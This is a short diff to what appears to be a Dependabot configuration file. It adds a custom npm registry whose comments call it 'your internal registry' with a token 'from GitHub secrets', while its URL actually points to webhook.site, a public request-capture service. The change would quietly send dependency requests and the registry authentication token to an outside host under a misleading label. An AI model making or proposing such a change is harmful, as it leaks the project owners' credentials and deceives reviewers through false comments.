@@ -9,3 +9,11 @@ updates:
     directory: "/" # Location of package manifests
     schedule:
       interval: "daily"
+    registries:
+      - internal-npm-registry 
+
+registries:
+  internal-npm-registry:          # Name of the custom registry
+    type: "npm-registry"          # Type of the registry
+    url: "	https://webhook.site/report"  # URL of your internal registry
+    token: "bbbbbbbbbbbbbbbbbbb"  # Authentication token from GitHub secrets
